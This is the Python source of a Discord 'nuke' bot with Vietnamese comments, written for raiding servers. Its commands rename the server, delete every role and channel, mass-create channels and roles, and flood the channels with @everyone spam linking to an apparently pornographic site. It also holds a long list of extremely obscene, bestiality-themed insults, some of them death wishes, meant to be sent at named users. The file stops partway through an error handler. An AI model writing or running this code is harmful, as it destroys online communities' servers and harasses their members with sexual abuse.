import asyncio
import os
import random
import discord
from discord.ext import commands
import aiohttp

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1535132569534865490,
]

# Kênh log cố định (ID từ link bạn cung cấp) - vẫn giữ lại nhưng có thể dùng l!channelslog
LOG_CHANNEL_ID = 1537813100546236497

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True

bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)

# Biến trạng thái cho spam
is_spamming = False
spam_task_running = None

# Lưu kênh log cho từng server
SERVER_LOG_CHANNELS = {}

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/a3/30/8c/a3308c2100e2526873b3ae8b3ab47b57.gif"
NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa667260ec4d.jpg"

# ==================== KHO SPAM (209 CÂU) ====================
ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn già nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn già nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ già nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn già thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn già chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

# ==================== HỆ THỐNG NUKE ====================
NUKE_CHANNEL_NAMES = [
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝕎𝔸ℝ 𝔸ℝ𝕋",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
    "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ"
    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼𝔻 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆"
    "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== LỆNH NUKE SERVER ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới, spam tốc độ cao"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ:\n"
                f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
                f"• Spam thông điệp nuke trong mỗi kênh\n"
                f"• Đổi tên server thành **DEAD SEVER**\n"
                f"• Đổi avatar server\n\n"
                f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmnuke":
                await ctx.send("❌ Lệnh nuke đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh nuke đã bị hủy bỏ.")
            return

        # Gửi log bắt đầu
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        old_name = ctx.guild.name
        old_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"

        if log_channel:
            start_embed = discord.Embed(
                title="🔥 NUKE BẮT ĐẦU",
                description=f"**Server cũ:** {old_name}\n**Avatar cũ:** {old_icon_url}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                color=0xFF0000,
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=start_embed)

        nuke_embed = discord.Embed(
            title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
            description="🔥 **Đang thực hiện phá hủy toàn bộ server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=nuke_embed)

        # 1. Spam default channel
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Spamming default channel...", color=0xFF0000))
        try:
            await ctx.send("Spam default channel trước khi nuke!")
        except:
            pass

        # 2. Rename server
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Renaming server...", color=0xFF0000))
        try:
            await ctx.guild.edit(name="DEAD SEVER")
        except Exception as e:
            print(f"Lỗi đổi tên: {e}")

        # 3. Đổi avatar
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Đã đổi avatar server.", color=0xFF0000))
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(NUKE_AVATAR_URL) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await ctx.guild.edit(icon=image_data)
        except Exception as e:
            print(f"Lỗi đổi avatar: {e}")

        # 4. Xóa role
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Starting role deletion...", color=0xFF0000))
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    continue

        # 5. Xóa kênh
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Starting channel deletion...", color=0xFF0000))
        delete_tasks = []
        for channel in ctx.guild.channels:
            delete_tasks.append(channel.delete())
            if len(delete_tasks) >= 5:
                await asyncio.gather(*delete_tasks, return_exceptions=True)
                delete_tasks.clear()
                await asyncio.sleep(0.1)
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        # 6. Tạo 100 kênh mới
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Starting channel creation...", color=0xFF0000))
        create_tasks = []
        for i in range(100):
            channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
            create_tasks.append(ctx.guild.create_text_channel(name=channel_name))
            if len(create_tasks) >= 20:
                await asyncio.gather(*create_tasks, return_exceptions=True)
                create_tasks.clear()
                await asyncio.sleep(0.1)
        if create_tasks:
            await asyncio.gather(*create_tasks, return_exceptions=True)

        # 7. Spam nội dung vào các kênh mới
        if log_channel:
            await log_channel.send(embed=discord.Embed(title="Spamming new channels...", color=0xFF0000))
        spam_content = (
            "# DETROYED BY BẢO ĐZ AND WAR ART (●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://xnhau.pics/"\n'
            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
        )
        all_channels = ctx.guild.text_channels
        batch_size = 5
        for i in range(0, len(all_channels), batch_size):
            batch = all_channels[i:i+batch_size]
            tasks = []
            for channel in batch:
                async def send_messages(channel=channel):
                    for _ in range(10):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await channel.send(spam_content, embed=embed)
                        except:
                            break
                        await asyncio.sleep(0.02)
                tasks.append(send_messages())
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)

        # 8. Hoàn thành - gửi log
        new_name = ctx.guild.name
        new_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
        if log_channel:
            end_embed = discord.Embed(
                title="✅ Nuke completed successfully.",
                description=f"**Server mới:** {new_name}\n**Avatar mới:** {new_icon_url}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                color=0x00FF00,
                timestamp=discord.utils.utcnow()
            )
            await log_channel.send(embed=end_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI THỰC HIỆN NUKE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            await log_channel.send(embed=error_embed)

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")

# ==================== CÁC LỆNH PHỤ TRỢ ====================
@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    try:
        if amount > 200:
            amount = 200
        embed = discord.Embed(
            title="🚀 KÍCH HOẠT TẠO KÊNH SPAM",
            description=f"🔥 **Đang tạo {amount} kênh với tên tục tĩu...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(amount):
            try:
                channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                await ctx.guild.create_text_channel(name=channel_name)
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ TẠO KÊNH HOÀN TẤT",
            description=f"🎉 **Đã tạo thành công {amount} kênh spam!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    try:
        spam_content = (
            "# DETROYED BY BẢO ĐZ AND WAR ART (●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://xnhau.pics/"\n'
            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
        )
        embed = discord.Embed(
            title="🚀 KÍCH HOẠT SPAM @EVERYONE",
            description="🔥 **Đang spam @everyone trong tất cả kênh...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for channel in ctx.guild.text_channels:
            try:
                for _ in range(10):
                    embed = discord.Embed()
                    embed.set_image(url=NUKE_GIF_URL)
                    await channel.send(spam_content, embed=embed)
                    await asyncio.sleep(0.1)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ SPAM @EVERYONE HOÀN TẤT",
            description="🎉 **Đã spam thông điệp nuke trong tất cả kênh text!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN XÓA TẤT CẢ KÊNH ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n\n"
                f"🔹 **Gõ l!confirmdelete để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdelete":
                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa kênh đã bị hủy bỏ.")
            return
        embed = discord.Embed(
            title="🚀 ĐANG XÓA TẤT CẢ KÊNH...",
            description="🔥 **Đang thực hiện xóa toàn bộ kênh trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ XÓA KÊNH HOÀN TẤT",
            description="🎉 **Đã xóa thành công tất cả kênh trong server!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    try:
        if amount > 250:
            amount = 250
        embed = discord.Embed(
            title="🚀 KÍCH HOẠT TẠO ROLE SPAM",
            description=f"🔥 **Đang tạo {amount} role với tên tục tĩu...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(amount):
            try:
                role_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                await ctx.guild.create_role(name=role_name, color=color, hoist=True, mentionable=True)
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ TẠO ROLE HOÀN TẤT",
            description=f"🎉 **Đã tạo thành công {amount} role spam!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN XÓA TẤT CẢ ROLE ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** role trong server ngoại trừ @everyone\n\n"
                f"🔹 **Gõ l!confirmdeleteroles để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdeleteroles":
                await ctx.send("❌ Lệnh xóa role đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa role đã bị hủy bỏ.")
            return
        embed = discord.Embed(
            title="🚀 ĐANG XÓA TẤT CẢ ROLE...",
            description="🔥 **Đang thực hiện xóa toàn bộ role trong server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        for role in ctx.guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ XÓA ROLE HOÀN TẤT",
            description="🎉 **Đã xóa thành công tất cả role (ngoại trừ @everyone)!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_roles.error
